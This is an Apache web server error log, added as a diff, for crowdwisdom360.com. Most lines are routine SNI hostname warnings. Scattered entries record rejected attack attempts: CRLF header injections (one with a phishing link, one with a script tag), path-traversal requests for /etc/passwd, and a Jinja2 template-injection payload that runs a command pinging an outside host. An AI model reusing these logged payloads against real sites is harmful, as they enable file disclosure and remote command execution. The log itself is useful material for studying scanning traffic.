@@ -1,0 +1,84 @@
+[Mon Jun 15 03:59:18.193223 2020] [ssl:error] [pid 20700] AH02032: Hostname www.crowdwisdom360.com provided via SNI and hostname crowdwisdom360.com provided via HTTP are different
+[Mon Jun 15 04:34:03.086610 2020] [ssl:error] [pid 21437] AH02032: Hostname www.crowdwisdom360.com provided via SNI and hostname crowdwisdom360.com provided via HTTP are different
+[Mon Jun 15 11:18:50.411598 2020] [ssl:error] [pid 10002] AH02032: Hostname www.crowdwisdom360.com provided via SNI and hostname crowdwisdom360.com provided via HTTP are different
+[Tue Jun 16 07:10:16.587861 2020] [ssl:error] [pid 9572] AH02032: Hostname www.crowdwisdom360.com provided via SNI and hostname crowdwisdom360.com provided via HTTP are different
+[Tue Jun 16 10:28:31.024601 2020] [ssl:error] [pid 20038] AH02032: Hostname www.crowdwisdom360.com provided via SNI and hostname crowdwisdom360.com provided via HTTP are different
+[Wed Jun 17 15:38:07.556038 2020] [ssl:error] [pid 19638] AH02032: Hostname www.crowdwisdom360.com provided via SNI and hostname crowdwisdom360.com provided via HTTP are different
+[Wed Jun 17 16:39:04.488252 2020] [ssl:error] [pid 23148] AH02032: Hostname www.crowdwisdom360.com provided via SNI and hostname crowdwisdom360.com provided via HTTP are different
+[Wed Jun 17 16:47:03.409621 2020] [ssl:error] [pid 23505] AH02032: Hostname www.crowdwisdom360.com provided via SNI and hostname crowdwisdom360.com provided via HTTP are different
+[Thu Jun 18 02:13:37.472755 2020] [ssl:error] [pid 20602] AH02032: Hostname www.crowdwisdom360.com provided via SNI and hostname crowdwisdom360.com provided via HTTP are different
+[Thu Jun 18 07:39:22.248268 2020] [ssl:error] [pid 3278] AH02032: Hostname www.crowdwisdom360.com provided via SNI and hostname crowdwisdom360.com provided via HTTP are different
+[Thu Jun 18 19:43:30.229318 2020] [ssl:error] [pid 11948] AH02032: Hostname www.crowdwisdom360.com provided via SNI and hostname crowdwisdom360.com provided via HTTP are different
+[Thu Jun 18 22:02:59.294234 2020] [ssl:error] [pid 20743] AH02032: Hostname www.crowdwisdom360.com provided via SNI and hostname crowdwisdom360.com provided via HTTP are different
+[Mon Jun 29 03:21:45.867984 2020] [ssl:error] [pid 29190] AH02032: Hostname www.crowdwisdom360.com provided via SNI and hostname crowdwisdom360.com provided via HTTP are different
+[Mon Jun 29 06:58:09.559253 2020] [ssl:error] [pid 2118] AH02032: Hostname www.crowdwisdom360.com provided via SNI and hostname crowdwisdom360.com provided via HTTP are different
+[Sun Aug 02 21:40:52.272044 2020] [http:error] [pid 9207] [client 89.41.26.26:8337] AH02430: Response header 'Location' value of 'https://www.crowdwisdom360.com/"\r\n/><h1><a href=https:/evil.com>Your password is currently unsafe, please click the link to update the information</a></h1>/' contains invalid characters, aborting request, referer: http://crowdwisdom360.com/
+[Mon Aug 03 09:05:46.104701 2020] [http:error] [pid 18010] [client 89.41.26.26:7559] AH02430: Response header 'Location' value of 'https://www.crowdwisdom360.com/foo\r\n\r\n"><script src=/xss.mx></script><x="' contains invalid characters, aborting request, referer: http://crowdwisdom360.com/
+[Sun Sep 13 19:10:09.774588 2020] [http:error] [pid 1065] [client 149.202.78.80:40110] AH02430: Response header 'Location' value of 'https://www.crowdwisdom360.com/\r\nset-cookie:abc=xyz' contains invalid characters, aborting request
+[Sun Oct 11 18:01:03.536199 2020] [core:error] [pid 3081] [client 137.74.46.39:53482] AH00126: Invalid URI in request GET /../../../../../../../../../../../../etc/passwd HTTP/1.1
+[Sun Oct 11 18:57:59.184425 2020] [core:error] [pid 7377] [client 137.74.46.39:51529] AH00126: Invalid URI in request GET /../../../../../../../../../../../../windows/win.ini HTTP/1.1
+[Tue Oct 13 02:08:04.477043 2020] [core:error] [pid 17797] [client 137.74.46.39:60122] AH00126: Invalid URI in request GET /../../../../../../../../../../../../../../windows/win.ini HTTP/1.1
+[Tue Oct 13 02:19:58.166638 2020] [core:error] [pid 18562] [client 137.74.46.39:59768] AH00126: Invalid URI in request GET /../../../../../../../../../../../../../../etc/passwd HTTP/1.1
+[Sat Oct 17 22:01:27.433461 2020] [core:error] [pid 16794] [client 77.35.18.233:63204] AH00126: Invalid URI in request GET crowdwisdom360.com HTTP/1.0
+[Fri Oct 30 23:37:46.207103 2020] [core:error] [pid 1192] [client 86.102.26.100:63752] AH00126: Invalid URI in request GET crowdwisdom360.com HTTP/1.0
+[Wed Dec 09 01:40:32.941399 2020] [http:error] [pid 10004] [client 78.108.43.212:61159] AH02430: Response header 'Location' value of 'https://www.crowdwisdom360.com/{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("ping ssti-crowdwisdom360.com.01h4x.com").read()}}{%endif%}{% endfor %}\n' contains invalid characters, aborting request, referer: {% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__["__import__"]("os").popen("ping ssti-crowdwisdom360.com.01h4x.com").read()}}{%endif%}{% endfor %}
+[Wed Dec 09 17:07:22.242655 2020] [http:error] [pid 904] [client 78.108.43.212:64692] AH02430: Response header 'Location' value of 'https://www.crowdwisdom360.com/{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("ping ssti-crowdwisdom360.com.01h4x.com").read()}}{%endif%}{% endfor %}\n' contains invalid characters, aborting request, referer: {% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__["__import__"]("os").popen("ping ssti-crowdwisdom360.com.01h4x.com").read()}}{%endif%}{% endfor %}
+[Tue Dec 15 09:53:26.161426 2020] [core:error] [pid 11567] [client 159.89.145.99:57044] AH00126: Invalid URI in request GET /../../../../../../../../../../../../../etc/passwd HTTP/1.1, referer: crowdwisdom360.com
+[Sun Mar 07 10:37:16.765993 2021] [ssl:error] [pid 6486] AH02032: Hostname www.crowdwisdom360.com provided via SNI and hostname crowdwisdom360.com provided via HTTP are different
+[Sun Mar 14 10:39:06.850273 2021] [ssl:error] [pid 10560] AH02032: Hostname www.crowdwisdom360.com provided via SNI and hostname crowdwisdom360.com provided via HTTP are different
+[Sun Mar 28 10:38:54.096416 2021] [ssl:error] [pid 5702] AH02032: Hostname www.crowdwisdom360.com provided via SNI and hostname crowdwisdom360.com provided via HTTP are different
+[Sun Apr 04 11:12:29.144354 2021] [ssl:error] [pid 14966] AH02032: Hostname www.crowdwisdom360.com provided via SNI and hostname crowdwisdom360.com provided via HTTP are different
+[Sun Apr 11 11:15:26.009822 2021] [ssl:error] [pid 15594] AH02032: Hostname www.crowdwisdom360.com provided via SNI and hostname crowdwisdom360.com provided via HTTP are different
+[Sun Apr 18 10:39:36.855402 2021] [ssl:error] [pid 29089] AH02032: Hostname www.crowdwisdom360.com provided via SNI and hostname crowdwisdom360.com provided via HTTP are different
+[Sun Apr 25 11:12:26.980958 2021] [ssl:error] [pid 532] AH02032: Hostname www.crowdwisdom360.com provided via SNI and hostname crowdwisdom360.com provided via HTTP are different
+[Sun May 02 10:50:39.402430 2021] [ssl:error] [pid 17076] AH02032: Hostname www.crowdwisdom360.com provided via SNI and hostname crowdwisdom360.com provided via HTTP are different
+[Sun May 09 10:51:01.790001 2021] [ssl:error] [pid 8270] AH02032: Hostname www.crowdwisdom360.com provided via SNI and hostname crowdwisdom360.com provided via HTTP are different
+[Sun May 16 12:09:10.089749 2021] [ssl:error] [pid 31591] AH02032: Hostname www.crowdwisdom360.com provided via SNI and hostname crowdwisdom360.com provided via HTTP are different
+[Sun May 23 12:11:26.561488 2021] [ssl:error] [pid 2025] AH02032: Hostname www.crowdwisdom360.com provided via SNI and hostname crowdwisdom360.com provided via HTTP are different
+[Sun May 30 12:07:41.709931 2021] [ssl:error] [pid 22121] AH02032: Hostname www.crowdwisdom360.com provided via SNI and hostname crowdwisdom360.com provided via HTTP are different
+[Sun Jun 06 10:58:11.729463 2021] [ssl:error] [pid 25655] AH02032: Hostname www.crowdwisdom360.com provided via SNI and hostname crowdwisdom360.com provided via HTTP are different
+[Sun Jun 13 10:49:34.859333 2021] [ssl:error] [pid 11195] AH02032: Hostname www.crowdwisdom360.com provided via SNI and hostname crowdwisdom360.com provided via HTTP are different
+[Sun Jun 20 10:49:42.776363 2021] [ssl:error] [pid 23782] AH02032: Hostname www.crowdwisdom360.com provided via SNI and hostname crowdwisdom360.com provided via HTTP are different
+[Sun Jun 27 11:10:16.376207 2021] [ssl:error] [pid 6956] AH02032: Hostname www.crowdwisdom360.com provided via SNI and hostname crowdwisdom360.com provided via HTTP are different
+[Sun Jul 18 14:07:13.276780 2021] [ssl:error] [pid 8246] AH02032: Hostname www.crowdwisdom360.com provided via SNI and hostname crowdwisdom360.com provided via HTTP are different
+[Sun Jul 25 11:28:35.733014 2021] [ssl:error] [pid 1327] AH02032: Hostname www.crowdwisdom360.com provided via SNI and hostname crowdwisdom360.com provided via HTTP are different
+[Sun Aug 01 10:55:17.528808 2021] [ssl:error] [pid 22904] AH02032: Hostname www.crowdwisdom360.com provided via SNI and hostname crowdwisdom360.com provided via HTTP are different
+[Sat Aug 07 03:14:43.713735 2021] [ssl:error] [pid 22231] AH02032: Hostname www.crowdwisdom360.com provided via SNI and hostname crowdwisdom360.com provided via HTTP are different
+[Sat Aug 14 04:30:12.152629 2021] [ssl:error] [pid 16151] AH02032: Hostname www.crowdwisdom360.com provided via SNI and hostname crowdwisdom360.com provided via HTTP are different
+[Sat Aug 21 04:27:35.234521 2021] [ssl:error] [pid 2873] AH02032: Hostname www.crowdwisdom360.com provided via SNI and hostname crowdwisdom360.com provided via HTTP are different
+[Sat Aug 28 04:34:19.475464 2021] [ssl:error] [pid 26483] AH02032: Hostname www.crowdwisdom360.com provided via SNI and hostname crowdwisdom360.com provided via HTTP are different
+[Sat Sep 04 09:28:48.182502 2021] [ssl:error] [pid 18050] AH02032: Hostname www.crowdwisdom360.com provided via SNI and hostname crowdwisdom360.com provided via HTTP are different
+[Sat Sep 11 06:28:12.501323 2021] [ssl:error] [pid 11639] AH02032: Hostname www.crowdwisdom360.com provided via SNI and hostname crowdwisdom360.com provided via HTTP are different
+[Sat Sep 18 07:08:41.962421 2021] [ssl:error] [pid 19122] AH02032: Hostname www.crowdwisdom360.com provided via SNI and hostname crowdwisdom360.com provided via HTTP are different
+[Fri Sep 24 23:08:49.534731 2021] [core:error] [pid 20113] [client 37.113.63.13:64809] AH00126: Invalid URI in request GET crowdwisdom360.com HTTP/1.0
+[Sat Sep 25 04:04:42.569840 2021] [ssl:error] [pid 8759] AH02032: Hostname www.crowdwisdom360.com provided via SNI and hostname crowdwisdom360.com provided via HTTP are different
+[Sun Sep 26 11:39:27.460453 2021] [core:error] [pid 17729] [client 37.113.63.13:50331] AH00126: Invalid URI in request GET crowdwisdom360.com HTTP/1.0
+[Sat Oct 02 06:38:37.220434 2021] [ssl:error] [pid 13232] AH02032: Hostname www.crowdwisdom360.com provided via SNI and hostname crowdwisdom360.com provided via HTTP are different
+[Tue Oct 05 23:58:33.696620 2021] [core:error] [pid 30578] [client 149.202.78.80:42026] AH00126: Invalid URI in request GET /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
+[Tue Oct 05 23:58:34.824999 2021] [core:error] [pid 30302] [client 149.202.78.80:44230] AH00126: Invalid URI in request GET /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
+[Wed Oct 06 02:40:45.884731 2021] [core:error] [pid 8937] [client 149.202.78.80:33056] AH00126: Invalid URI in request GET /icons/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
+[Wed Oct 06 02:40:46.983982 2021] [core:error] [pid 8938] [client 149.202.78.80:35268] AH00126: Invalid URI in request GET /icons/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
+[Wed Oct 06 04:38:08.972621 2021] [core:error] [pid 15840] [client 159.65.20.242:39144] AH00126: Invalid URI in request GET /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/resolv.conf HTTP/1.1
+[Wed Oct 06 18:38:40.711264 2021] [core:error] [pid 8046] [client 68.183.212.52:44948] AH00126: Invalid URI in request GET /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/hosts HTTP/1.1
+[Wed Oct 06 21:22:09.871800 2021] [core:error] [pid 19411] [client 59.12.193.82:50736] AH00126: Invalid URI in request GET /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
+[Thu Oct 07 00:08:10.811848 2021] [core:error] [pid 31322] [client 162.241.114.189:37100] AH00126: Invalid URI in request HEAD /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
+[Thu Oct 07 00:08:12.373623 2021] [core:error] [pid 31325] [client 162.241.114.189:40270] AH00126: Invalid URI in request HEAD /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
+[Thu Oct 07 03:25:41.916743 2021] [core:error] [pid 11538] [client 162.241.114.189:34142] AH00126: Invalid URI in request HEAD /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
+[Thu Oct 07 03:25:43.361820 2021] [core:error] [pid 11196] [client 162.241.114.189:37352] AH00126: Invalid URI in request HEAD /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
+[Thu Oct 07 04:53:55.014045 2021] [core:error] [pid 16202] [client 3.83.56.46:49356] AH00126: Invalid URI in request GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/services HTTP/1.1
+[Thu Oct 07 23:25:33.605985 2021] [core:error] [pid 28409] [client 46.101.80.8:37672] AH00126: Invalid URI in request GET /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/hosts HTTP/1.1
+[Sat Oct 09 06:34:42.135253 2021] [ssl:error] [pid 25259] AH02032: Hostname www.crowdwisdom360.com provided via SNI and hostname crowdwisdom360.com provided via HTTP are different
+[Mon Oct 11 16:07:33.773402 2021] [core:error] [pid 4088] [client 69.49.235.93:45010] AH00126: Invalid URI in request HEAD /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
+[Mon Oct 11 16:07:35.189558 2021] [core:error] [pid 4218] [client 69.49.235.93:37378] AH00126: Invalid URI in request HEAD /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
+[Mon Oct 11 16:16:30.505305 2021] [core:error] [pid 4874] [client 162.241.114.189:51454] AH00126: Invalid URI in request HEAD /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
+[Mon Oct 11 16:16:32.030198 2021] [core:error] [pid 5097] [client 162.241.114.189:60190] AH00126: Invalid URI in request HEAD /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
+[Sat Oct 16 04:19:38.276710 2021] [ssl:error] [pid 22350] AH02032: Hostname www.crowdwisdom360.com provided via SNI and hostname crowdwisdom360.com provided via HTTP are different
+[Sat Oct 23 03:19:07.687035 2021] [ssl:error] [pid 30658] AH02032: Hostname www.crowdwisdom360.com provided via SNI and hostname crowdwisdom360.com provided via HTTP are different
+[Sat Oct 30 06:24:35.997512 2021] [ssl:error] [pid 11552] AH02032: Hostname www.crowdwisdom360.com provided via SNI and hostname crowdwisdom360.com provided via HTTP are different
+[Sun Oct 31 05:45:38.847549 2021] [core:error] [pid 11293] [client 37.113.11.121:58054] AH00126: Invalid URI in request GET crowdwisdom360.com HTTP/1.0
+[Wed Nov 03 09:55:09.323349 2021] [core:error] [pid 25026] [client 37.113.11.121:58881] AH00126: Invalid URI in request GET crowdwisdom360.com HTTP/1.0
+[Sat Nov 06 22:22:32.137090 2021] [ssl:error] [pid 900] AH02032: Hostname www.crowdwisdom360.com provided via SNI and hostname crowdwisdom360.com provided via HTTP are different
+[Sat Nov 13 18:30:53.782775 2021] [ssl:error] [pid 9959] AH02032: Hostname www.crowdwisdom360.com provided via SNI and hostname crowdwisdom360.com provided via HTTP are different
+[Sat Nov 20 12:04:51.744132 2021] [ssl:error] [pid 6691] AH02032: Hostname www.crowdwisdom360.com provided via SNI and hostname crowdwisdom360.com provided via HTTP are different
+[Thu Nov 25 23:06:09.252359 2021] [core:error] [pid 10261] [client 13.82.226.115:57018] AH00126: Invalid URI in request GET /cgi-bin/.%2E/%2E%2E/%2E%2E/%2E%2E/etc/passwd HTTP/1.1
+[Sat Nov 27 03:04:42.216595 2021] [ssl:error] [pid 25435] AH02032: Hostname www.crowdwisdom360.com provided via SNI and hostname crowdwisdom360.com provided via HTTP are different
